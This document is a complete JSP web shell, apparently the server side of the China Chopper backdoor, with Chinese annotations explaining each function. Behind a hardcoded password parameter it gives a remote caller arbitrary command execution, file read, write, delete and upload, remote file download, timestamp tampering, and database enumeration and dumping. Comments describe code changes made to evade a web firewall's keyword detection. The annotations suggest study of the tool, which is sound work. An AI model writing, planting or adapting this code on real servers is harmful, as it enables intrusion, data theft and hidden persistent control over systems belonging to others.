<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!String Pwd = "lee";
	String cs = "UTF-8";

	String EC(String s) throws Exception {
		return new String(s.getBytes("ISO-8859-1"), cs);
	}

	//依照给定的参数s连接数据库  
	//以choraheiheihei作为分割(作者很调皮)
	//第一行是数据库驱动类名  
	//第二行是判断连接了什么数据库
	//后面的if，应该是判断数据库名 
	Connection GC(String s) throws Exception {
		String[] x = s.trim().split("choraheiheihei");
		Class.forName(x[0].trim());
		if (x[1].indexOf("jdbc:oracle") != -1) {
			return DriverManager.getConnection(x[1].trim() + ":" + x[4],
					x[2].equalsIgnoreCase("[/null]") ? "" : x[2],
					x[3].equalsIgnoreCase("[/null]") ? "" : x[3]);
		} else {
			Connection c = DriverManager.getConnection(x[1].trim(),
					x[2].equalsIgnoreCase("[/null]") ? "" : x[2],
					x[3].equalsIgnoreCase("[/null]") ? "" : x[3]);
			if (x.length > 4) {
				c.setCatalog(x[4]);
			}
			return c;
		}
	}

	//得到系统中所有根目录下的每一个文件的名字的前两个字母，写入StringBuffer  
	void AA(StringBuffer sb) throws Exception {
		File k = new File("");//查了下资料，这两行的改动会绕过安全狗识别的关键字 
		File r[] = k.listRoots();//查了下资料，这两行的改动会绕过安全狗识别的关键字 
		for (int i = 0; i < r.length; i++) {
			sb.append(r[i].toString().substring(0, 2));
		}
	}

	//得到指定路径下所有文件的文件名、最后一次修改时间、文件大小、是否可读可写属性，写入StringBuffer  
	void BB(String s, StringBuffer sb) throws Exception {
		File oF = new File(s), l[] = oF.listFiles();
		String sT, sQ, sF = "";
		java.util.Date dt;
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		for (int i = 0; i < l.length; i++) {
			dt = new java.util.Date(l[i].lastModified());
			sT = fm.format(dt);
			sQ = l[i].canRead() ? "R" : "";
			sQ += l[i].canWrite() ? " W" : "";
			if (l[i].isDirectory()) {
				sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()
						+ "\t" + sQ + "\n");
			} else {
				sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"
						+ sQ + "\n";
			}
		}
		sb.append(sF);
	}

	//迭代删除给定路径下的所有文件和文件夹
	void EE(String s) throws Exception {
		File f = new File(s);
		if (f.isDirectory()) {
			File x[] = f.listFiles();
			for (int k = 0; k < x.length; k++) {
				if (!x[k].delete()) {
					EE(x[k].getPath());
				}
			}
		}
		f.delete();
	}

	//以“>|”作为菜刀的特征之一，以后会不会改下源码？毕竟只是一个符号???

	//将指定路径的文件以流的形式写到response里面  
	void FF(String s, HttpServletResponse r) throws Exception {
		int n;
		byte[] b = new byte[512];
		r.reset();
		ServletOutputStream os = r.getOutputStream();
		BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
		os.write(("->" + "|").getBytes(), 0, 3);
		while ((n = is.read(b, 0, 512)) != -1) {
			os.write(b, 0, n);
		}
		os.write(("|" + "<-").getBytes(), 0, 3);
		os.close();
		is.close();
	}

	//这个方法有啥用啊？没看懂
	void GG(String s, String d) throws Exception {
		String h = "0123456789ABCDEF";
		File f = new File(s);
		f.createNewFile();
		FileOutputStream os = new FileOutputStream(f);
		for (int i = 0; i < d.length(); i += 2) {
			os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));
		}
		os.close();
	}

	//将s指定的文件的内容写到d指定的文件里面。如果s指定的是一个文件夹，那么就将s目录下的所有文件拷贝到d目录下  
	void HH(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		if (sf.isDirectory()) {
			if (!df.exists()) {
				df.mkdir();
			}
			File z[] = sf.listFiles();
			for (int j = 0; j < z.length; j++) {
				HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());
			}
		} else {
			FileInputStream is = new FileInputStream(sf);
			FileOutputStream os = new FileOutputStream(df);
			int n;
			byte[] b = new byte[512];
			while ((n = is.read(b, 0, 512)) != -1) {
				os.write(b, 0, n);
			}
			is.close();
			os.close();
		}
	}

	//更改文件名  
	void II(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		sf.renameTo(df);
	}

	//创建目录
	void JJ(String s) throws Exception {
		File f = new File(s);
		f.mkdir();
	}

	//修改文件的最后修改时间这个属性 
	void KK(String s, String t) throws Exception {
		File f = new File(s);
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		java.util.Date dt = fm.parse(t);
		f.setLastModified(dt.getTime());
	}

	//s参数为url,将url的内容写入d参数指定的文件中(代码稍微简化了下，功能一样)  
	void LL(String s, String d) throws Exception {
		URL u = new URL(s);
		int n = 0;
		FileOutputStream os = new FileOutputStream(d);
		HttpURLConnection h = (HttpURLConnection) u.openConnection();
		InputStream is = h.getInputStream();
		byte[] b = new byte[512];
		while ((n = is.read(b)) != -1) {
			os.write(b, 0, n);
		}
		os.close();
		is.close();
		h.disconnect();
	}

	//将流一行一行写入StringBuffer
	void MM(InputStream is, StringBuffer sb) throws Exception {
		String l;
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		while ((l = br.readLine()) != null) {
			sb.append(l + "\r\n");
		}
	}

	//得到所有的数据库的名称，写入StringBuffer
	//根据不同数据库判断
	void NN(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		ResultSet r = s.indexOf("jdbc:oracle") != -1 ? c.getMetaData()
				.getSchemas() : c.getMetaData().getCatalogs();
		while (r.next()) {
			sb.append(r.getString(1) + "\t|\t\r\n");
		}
		r.close();
		c.close();
	}

	//获取数据库所有的表，写入StringBuffer
	//
	void OO(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		String[] x = s.trim().split("choraheiheihei");
		ResultSet r = c.getMetaData().getTables(
				null,
				s.indexOf("jdbc:oracle") != -1 ? x.length > 5 ? x[5] : x[4]
						: null, "%", new String[] { "TABLE" });
		while (r.next()) {
			sb.append(r.getString("TABLE_NAME") + "\t|\t\r\n");
		}
		r.close();
		c.close();
	}

	//s的前三行参数同GC()方法，第四行为表名，得到该表的每一列的列名和类型，写入StringBuffer 
	//
	void PP(String s, StringBuffer sb) throws Exception {
		String[] x = s.trim().split("\r\n");
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1007);
		ResultSet r = m.executeQuery("select * from " + x[x.length - 1]);
		ResultSetMetaData d = r.getMetaData();
		for (int i = 1; i <= d.getColumnCount(); i++) {
			sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)
					+ ")\t");
		}
		r.close();
		m.close();
		c.close();
	}

	//q为查询的sql语句，将查询的结果写入StringBuffer  
	//
	void QQ(String cs, String s, String q, StringBuffer sb, String p)
			throws Exception {
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1008);
		BufferedWriter bw = null;
		try {
			ResultSet r = m.executeQuery(q.indexOf("--f:") != -1 ? q.substring(
					0, q.indexOf("--f:")) : q);
			ResultSetMetaData d = r.getMetaData();
			int n = d.getColumnCount();
			for (int i = 1; i <= n; i++) {
				sb.append(d.getColumnName(i) + "\t|\t");
			}
			sb.append("\r\n");
			if (q.indexOf("--f:") != -1) {
				File file = new File(p);
				if (q.indexOf("-to:") == -1) {
					file.mkdir();
				}
				bw = new BufferedWriter(new OutputStreamWriter(
						new FileOutputStream(new File(
								q.indexOf("-to:") != -1 ? p.trim() : p
										+ q.substring(q.indexOf("--f:") + 4,
												q.length()).trim()), true), cs));
			}
			while (r.next()) {
				for (int i = 1; i <= n; i++) {
					if (q.indexOf("--f:") != -1) {
						bw.write(r.getObject(i) + "" + "\t");
						bw.flush();
					} else {
						sb.append(r.getObject(i) + "" + "\t|\t");
					}
				}
				if (bw != null) {
					bw.newLine();
				}
				sb.append("\r\n");
			}
			r.close();
			if (bw != null) {
				bw.close();
			}
		} catch (Exception e) {
			sb.append("Result\t|\t\r\n");
			try {
				m.executeUpdate(q);
				sb.append("Execute Successfully!\t|\t\r\n");
			} catch (Exception ee) {
				sb.append(ee.toString() + "\t|\t\r\n");
			}
		}
		m.close();
		c.close();
	}%>
<%
	//以下为访问URL时带的参数 
	//A:显示主页功能??
	//B:读取主页功能
	//C:读取文件功能
	//D:保存文件
	//E:删除文件夹以及文件功能
	//I:重命名文件夹以及文件功能
	//K:修改文件的最后修改时间这个属性
	//J:新建目录功能
	//G:上传文件功能
	//F:下载文件功能
	//M:虚拟终端功能
	//Q:导出表

	//String Z = EC(request.getParameter(Pwd) + "", cs);//来自网上的其他写法

	cs = request.getParameter("code") != null ? request
			.getParameter("code") + "" : cs;//code：编码 //这里做了一个小优化
	request.setCharacterEncoding(cs);
	response.setContentType("text/html;charset=" + cs);
	StringBuffer sb = new StringBuffer("");
	if (request.getParameter(Pwd) != null) {//Pwd在这里是一个特殊的参数

		try {
			String Z = EC(request.getParameter("action") + "");//action为功能选项
			String z1 = EC(request.getParameter("z1") + "");
			String z2 = EC(request.getParameter("z2") + "");
			sb.append("->" + "|");//所谓菜刀“标志”在这里设置 ->|  //但作者已在客户端写死，目前版本不易在这里修改
			String s = request.getSession().getServletContext()
					.getRealPath("/");//获取项目根目录，例如：/home/lee/_software/apache-tomcat-7.0.65/webapps/test/
			if (Z.equals("A")) {
				sb.append(s + "\t");
				if (!s.substring(0, 1).equals("/")) {
					AA(sb);
				}
			} else if (Z.equals("B")) {
				BB(z1, sb);
			} else if (Z.equals("C")) {
				String l = "";
				BufferedReader br = new BufferedReader(
						new InputStreamReader(new FileInputStream(
								new File(z1))));
				while ((l = br.readLine()) != null) {
					sb.append(l + "\r\n");
				}
				br.close();
			} else if (Z.equals("D")) {
				BufferedWriter bw = new BufferedWriter(
						new OutputStreamWriter(new FileOutputStream(
								new File(z1))));
				bw.write(z2);
				bw.close();
				sb.append("1");
			} else if (Z.equals("E")) {
				EE(z1);
				sb.append("1");
			} else if (Z.equals("F")) {
				FF(z1, response);
			} else if (Z.equals("G")) {
				GG(z1, z2);
				sb.append("1");
			} else if (Z.equals("H")) {
				HH(z1, z2);
				sb.append("1");
			} else if (Z.equals("I")) {
				II(z1, z2);
				sb.append("1");
			} else if (Z.equals("J")) {
				JJ(z1);
				sb.append("1");
			} else if (Z.equals("K")) {
				KK(z1, z2);
				sb.append("1");
			} else if (Z.equals("L")) {
				LL(z1, z2);
				sb.append("1");
			} else if (Z.equals("M")) {
				String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
				Process p = Runtime.getRuntime().exec(c);
				MM(p.getInputStream(), sb);
				MM(p.getErrorStream(), sb);
			} else if (Z.equals("N")) {
				NN(z1, sb);
			} else if (Z.equals("O")) {
				OO(z1, sb);
			} else if (Z.equals("P")) {
				PP(z1, sb);
			} else if (Z.equals("Q")) {
				QQ(cs,
						z1,
						z2,
						sb,
						z2.indexOf("-to:") != -1 ? z2.substring(
								z2.indexOf("-to:") + 4, z2.length())
								: s.replaceAll("\\\\", "/") + "images/");
			}
		} catch (Exception e) {
			sb.append("ERROR" + ":// " + e.toString());
		}
		sb.append("|" + "<-");
		out.print(sb.toString());
	}
%>
